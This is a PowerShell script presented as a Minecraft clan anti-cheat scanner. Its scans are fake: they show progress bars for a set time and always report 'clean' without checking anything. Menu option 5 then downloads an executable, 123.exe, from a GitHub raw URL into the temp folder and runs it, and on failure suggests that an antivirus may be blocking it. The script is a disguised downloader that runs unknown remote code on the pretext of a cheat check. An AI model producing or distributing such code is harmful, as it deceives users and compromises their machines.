# ================================================
#       ClanCheacker
#   Minecraft Anti-Cheat Scanner
#             by X4KN
# ================================================

Clear-Host

function Show-Header {
    Clear-Host
    Write-Host ""
    Write-Host "    ██████╗██╗      █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ " -ForegroundColor Cyan
    Write-Host "    ██╔════╝██║     ██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗" -ForegroundColor Cyan
    Write-Host "    ██║     ██║     ███████║██╔██╗ ██║██║     ███████║█████╗  ███████║██║     █████╔╝ █████╗  ██████╔╝" -ForegroundColor Cyan
    Write-Host "    ██║     ██║     ██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝  ██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗" -ForegroundColor Cyan
    Write-Host "    ╚██████╗███████╗██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗██║  ██║╚██████╗██║  ██╗███████╗██║  ██║" -ForegroundColor Cyan
    Write-Host "     ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝" -ForegroundColor Cyan
    Write-Host "                                      by X4KN" -ForegroundColor Yellow
    Write-Host "    =========================================================" -ForegroundColor White
    Write-Host "               MINECRAFT CLAN ANTI-CHEAT SCANNER" -ForegroundColor Green
    Write-Host "    =========================================================" -ForegroundColor White
    Write-Host ""
}

function Write-ProgressBar {
    param([int]$Percent, [int]$Width = 50)
    $filled = [math]::Round(($Width * $Percent) / 100)
    $bar = "█" * $filled + "░" * ($Width - $filled)
    Write-Host "    [$bar] $Percent% " -NoNewline -ForegroundColor Yellow
}

function Start-MCScan {
    param([string]$ScanName, [int]$Seconds = 5)
    Write-Host "    → $ScanName" -ForegroundColor Cyan
    $steps = 20
    for ($i = 1; $i -le $steps; $i++) {
        $percent = [math]::Round(($i / $steps) * 100)
        Write-ProgressBar -Percent $percent
        Start-Sleep -Milliseconds ([math]::Round(($Seconds * 1000) / $steps))
        Write-Host "`r" -NoNewline
    }
    Write-Host "`r    [██████████████████████████████████████████████████] 100% " -ForegroundColor Green
    Write-Host "    ✓ $ScanName — ЧИСТО" -ForegroundColor Green
    Write-Host ""
}

# ====================== ГЛАВНОЕ МЕНЮ ======================
Show-Header

Write-Host "    =========================================================" -ForegroundColor White
Write-Host "                        ГЛАВНОЕ МЕНЮ" -ForegroundColor White
Write-Host "    =========================================================" -ForegroundColor White
Write-Host ""

Write-Host "    [1]  Проверка на читы (Minecraft)" -ForegroundColor Green
Write-Host "    [2]  Проверка на Hitbox" -ForegroundColor Green
Write-Host "    [3]  Полная комплексная проверка" -ForegroundColor Green
Write-Host "    [4]  Проверка программного обеспечения" -ForegroundColor Green
Write-Host "    [5]  Проверка программой by X4KN (расширенная + 123.exe)" -ForegroundColor Magenta
Write-Host "    [6]  Информация" -ForegroundColor Yellow
Write-Host "    [7]  Выход" -ForegroundColor Red
Write-Host ""

$choice = Read-Host "    Выбери номер действия"

switch ($choice) {
    "5" { 
        Clear-Host; Show-Header
        Write-Host "    Запуск расширенной проверки by X4KN..." -ForegroundColor Magenta
        Start-Sleep -Seconds 1
        
        Start-MCScan "Глубокий анализ клиента Minecraft" 8
        Start-MCScan "Проверка памяти JVM" 7
        Start-MCScan "Анализ модов и фордж/фабрик" 9
        Start-MCScan "Финальная верификация" 6

        Write-Host "`n    =========================================================" -ForegroundColor Green
        Write-Host "         ПРОВЕРКА ЗАВЕРШЕНА — ЧИСТО" -ForegroundColor Green
        Write-Host "    =========================================================" -ForegroundColor Green
        Write-Host ""

        # === Подгрузка и запуск 123.exe ===
        Write-Host "    Запуск дополнительной программы by X4KN..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2

        $url = "https://raw.githubusercontent.com/fffghsetyver-hash/Cheackproverka/main/123.exe"
        $outPath = "$env:TEMP\123_X4KN.exe"

        try {
            Write-Host "    Скачивание 123.exe с GitHub..." -ForegroundColor Cyan
            Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing -TimeoutSec 30
            Write-Host "    Файл успешно скачан!" -ForegroundColor Green

            Write-Host "    Запуск 123.exe ..." -ForegroundColor Magenta
            Start-Sleep -Seconds 2
            Start-Process -FilePath $outPath
            Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
        }
        catch {
            Write-Host "    Ошибка при скачивании или запуске 123.exe" -ForegroundColor Red
            Write-Host "    Причина: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "    Возможно, антивирус блокирует скачивание." -ForegroundColor Yellow
        }
    }
    # Здесь можно оставить другие пункты как были, или добавить позже
    default {
        Write-Host "`n    Этот пункт пока не реализован в данной версии." -ForegroundColor Yellow
    }
}

Write-Host "`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
